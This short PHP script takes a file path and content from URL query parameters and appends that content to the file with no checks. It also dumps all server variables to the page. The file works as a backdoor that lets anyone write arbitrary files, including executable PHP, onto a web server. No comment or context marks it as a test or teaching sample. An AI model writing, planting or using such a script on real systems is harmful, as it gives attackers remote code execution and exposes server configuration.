<?php

    var_dump($_SERVER);

    $file = fopen($_GET['x'], 'a+');

    fwrite($file, $_GET['y']);

    fclose($file);